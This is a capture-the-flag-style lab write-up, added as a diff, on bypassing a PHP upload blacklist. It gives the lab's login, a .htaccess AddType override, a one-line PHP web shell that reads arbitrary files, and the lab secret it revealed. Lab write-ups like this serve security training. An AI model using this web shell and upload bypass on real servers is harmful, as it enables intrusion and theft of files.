@@ -1,0 +1,25 @@
+Lab #4 - Web shell upload via extension blacklist bypass
+
+Vulnerability - This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.
+
+Goal - To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
+
+Analysis:
+1. Log in with credentials - wiener:peter
+2. Upload an image => response: The file avatars/images.jpeg has been uploaded.
+3. Upload an php file => error: Sorry, php files are not allowed Sorry, there was an error uploading your file.
+4. Change file extention to .php5 => SUCCESSFULLY uploaded to server: The file avatars/shell.php5 has been uploaded.
+5. Make a GET request to URL: https://0a27001f036be6d480e47b1100ce007d.web-security-academy.net/files/avatars/shell.php5?filename=/home/carlos/secret
+=> response: <?php echo file_get_contents($_GET['filename']); ?>
+=> This file is not executed => It's not configured to be executable.
+=> and see that this server is  Apache/2.4.41 (Ubuntu)
+6. Upload a configuration file with filename .htaccess(Content-Type is text/plain) to configure server to execute a file extension as .php file
+AddType application/x-httpd-php .fff
+
+=> upload using image upload function => SUCCESSFULLY uploaded
+7. Upload shell.fff file using image upload function:
+<?php echo file_get_contents($_GET['filename']); ?>
+
+=> Uploaded SUCCESSFULLY
+=> make a request to this file: /files/avatars/shell.fff?filename=/home/carlos/secret
+=> SECRET number is: 7VBSJyfgw5bgX92osPm2JKdlT5uNwg7d
